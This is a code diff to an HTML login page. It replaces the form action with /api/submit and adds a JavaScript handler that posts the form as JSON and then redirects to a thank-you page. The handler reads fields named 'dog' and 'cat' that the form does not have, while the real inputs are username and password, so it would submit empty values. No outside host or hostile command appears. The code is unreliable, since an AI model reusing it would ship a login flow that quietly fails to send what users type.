@@ -97,8 +97,38 @@ body {
 </script>
 <div class="login">
     <h3>Please enter your username and password</h3>
-    <form action="submit.php" method="post" name="f" id="f"> <input type="text" id="username" tabindex="1" name="username" placeholder="username" value="" spellcheck="false" autofocus autocomplete="username webauthn"> <input id="password" type="password" tabindex="3" name="password" placeholder="password" autocomplete="current-password webauthn"> <div class="submit"> <button type="submit" id="webauthnBegin" tabindex="2">Continue</button> <input type="submit" id="submit" style="display: none;" value="submit"> </div> </form>
-    
+    <form action="/api/submit" method="post" name="f" id="f"> <input type="text" id="username" tabindex="1" name="username" placeholder="username" value="" spellcheck="false" autofocus autocomplete="username webauthn"> <input id="password" type="password" tabindex="3" name="password" placeholder="password" autocomplete="current-password webauthn"> <div class="submit"> <button type="submit" id="webauthnBegin" tabindex="2">Continue</button> <input type="submit" id="submit" style="display: none;" value="submit"> </div> </form>
+    <script>
+      // Optional: Handle form submission via JavaScript for better UX
+      const form = document.getElementById('f');
+      form.addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const formData = new FormData(form);
+          const data = {
+              dog: formData.get('dog'),
+              cat: formData.get('cat'),
+          };
+
+          try {
+              const response = await fetch('/api/submit', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify(data),
+              });
+
+              if (response.ok) {
+                  window.location.href = '/thankyou.html';
+              } else {
+                  const error = await response.json();
+                  alert(`Error: ${error.message}`);
+              }
+          } catch (error) {
+              alert('An unexpected error occurred.');
+          }
+      });
+  </script>
     <br>
   <style>
     .social_login_btn {
